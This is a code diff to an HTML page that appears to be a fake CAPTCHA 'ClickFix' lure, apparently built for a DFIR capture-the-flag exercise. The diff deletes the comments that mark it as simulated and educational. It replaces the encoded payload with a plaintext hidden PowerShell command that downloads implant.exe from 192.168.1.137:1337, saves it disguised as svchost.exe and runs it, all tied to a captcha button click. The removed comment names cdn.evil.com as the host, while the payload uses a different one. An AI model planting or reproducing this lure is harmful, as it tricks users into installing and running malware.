@@ -198,19 +198,9 @@
     </div>
 
     <script>
-        // ClickFix Malware Loader - DFIR CTF Challenge
-        // WARNING: This is a simulated attack for educational/CTF purposes only
+       
         
-        // Encoded payload (226 chars - fits in Windows Run dialog 260 char limit)
-        // Decoded command:
-        // iwr cdn.evil.com/l.exe -O $env:temp\svchost.exe;start $env:temp\svchost.exe
-        //
-        // What it does:
-        // 1. Downloads malware from cdn.evil.com/l.exe
-        // 2. Saves as svchost.exe in %TEMP% (masquerading as Windows process)
-        // 3. Executes the malware immediately
-        
-        const maliciousPayload = `powershell -w hidden -enc aQB3AHIAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQAzADcAOgAxADMAMwA3AC8AaQBtAHAAbABhAG4AdAAuAGUAeABlACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0ATwAgACQAZQBuAHYAOgB0AGUAbQBwAFwAcwB2AGMAaABvAHMAdAAuAGUAeABlADsAcwB0AGEAcgB0ACAAJABlAG4AdgA6AHQAZQBtAHAAXABzAHYAYwBoAG8AcwB0AC4AZQB4AGUA`;
+        const maliciousPayload = `powershell -w hidden iwr http://192.168.1.137:1337/implant.exe -UseBasicParsing -O $env:temp\svchost.exe;start $env:temp\svchost.exe`;
 
         document.getElementById('captchaBtn').addEventListener('click', async function() {
             try {
